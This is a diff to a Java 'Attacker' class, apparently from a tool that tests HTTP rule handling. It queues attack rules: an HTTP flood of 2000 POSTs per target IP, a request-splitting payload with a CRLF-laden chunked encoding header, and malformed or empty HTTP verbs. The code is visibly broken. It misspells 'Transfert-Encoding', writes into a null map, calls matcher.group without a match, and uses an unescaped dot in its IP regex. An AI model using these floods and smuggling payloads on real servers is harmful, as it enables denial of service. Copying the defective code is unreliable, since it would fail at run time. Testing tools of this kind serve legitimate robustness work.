@@ -1,3 +1,4 @@
+import model.InOutRule;
 import model.OutInRule;
 import model.Request;
 import model.Rule;
@@ -5,6 +6,9 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.net.http.HttpRequest;
 import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -74,11 +78,12 @@ public class Attacker {
     public List<String> getIpAddresses() {
         List<String> ipAddresses = new ArrayList<>();
         for (Rule rule : rules) {
-            if (rule.getRequest().getPath().matches("(([0-9]{1,3}.){3}[0-9]{1,3})")) {
-                Pattern pattern = Pattern.compile("(([0-9]{1,3}.){3}[0-9]{1,3})");
-                Matcher matcher = pattern.matcher(rule.getRequest().getPath());
-                ipAddresses.add(matcher.group(1));
+            if (rule instanceof InOutRule) {
+                continue;
             }
+            Pattern pattern = Pattern.compile("(([0-9]{1,3}.){3}[0-9]{1,3})");
+            Matcher matcher = pattern.matcher(rule.getRequest().getPath());
+            ipAddresses.add(matcher.group(1));
         }
         return ipAddresses;
     }
@@ -95,9 +100,24 @@ public class Attacker {
 
         for (String ipAddress : getIpAddresses()) {
             OutInRule httpFloodRule = new OutInRule(new Request("POST", ipAddress, null, content),
-                    null, (long) 0, 2000, (long) 0);
-            OutputRequest httpFloodRequest = new OutputRequest(httpFloodRule);
-            httpFloodRequest.start();
+                    null, 0L, 2000, 0L);
+            attackRules.add(httpFloodRule);
+        }
+    }
+
+    public void requestSplittingAttack() throws URISyntaxException {
+        Map<String, String> headers = null;
+        headers.put("Transfert-Encoding", "chunked\r\n\r\n0\r\n\r\n");
+        for (String ipAddress : getIpAddresses()) {
+            Request reqToInject = new Request("POST", ipAddress, null, "HTTP Request Splitting Attack");
+            HttpRequest.Builder builder = HttpRequest.newBuilder()
+                    .method(reqToInject.getMethod(), HttpRequest.BodyPublishers.ofString(reqToInject.getBody()))
+                    .uri(new URI(reqToInject.getPath()));
+            String encodedReq = builder.build().toString();
+
+            OutInRule reqSplittingRule = new OutInRule(new Request("POST", ipAddress, headers, encodedReq),
+                    null, 0L, 1, null);
+            attackRules.add(reqSplittingRule);
         }
     }
 
@@ -111,18 +131,16 @@ public class Attacker {
     public void verbNotExist() {
         for (String ipAddress : getIpAddresses()) {
             OutInRule wrongVerbRule = new OutInRule(new Request("wrongVerb", ipAddress, null, null),
-                    null, (long) 0, 1, null);
-            OutputRequest wrongVerbRequest = new OutputRequest(wrongVerbRule);
-            wrongVerbRequest.start();
+                    null, 0L, 1, null);
+            attackRules.add(wrongVerbRule);
         }
     }
 
     public void emptyVerb() {
         for (String ipAddress : getIpAddresses()) {
             OutInRule emptyVerbRule = new OutInRule(new Request("", ipAddress, null, null), null,
-                    (long) 0, 1, null);
-            OutputRequest emptyVerbRequest = new OutputRequest(emptyVerbRule);
-            emptyVerbRequest.start();
+                    0L, 1, null);
+            attackRules.add(emptyVerbRule);
         }
     }
 
@@ -131,9 +149,8 @@ public class Attacker {
         headers.put("~`^@=+*", "$€£¤ø");
         for (String ipAddress : getIpAddresses()) {
             OutInRule specialCharRule = new OutInRule(new Request("&'ƒ#%Šµ", ipAddress, headers, null), null,
-                    (long) 0, 1, null);
-            OutputRequest specialCharRequest = new OutputRequest(specialCharRule);
-            specialCharRequest.start();
+                    0L, 1, null);
+            attackRules.add(specialCharRule);
         }
     }
 }
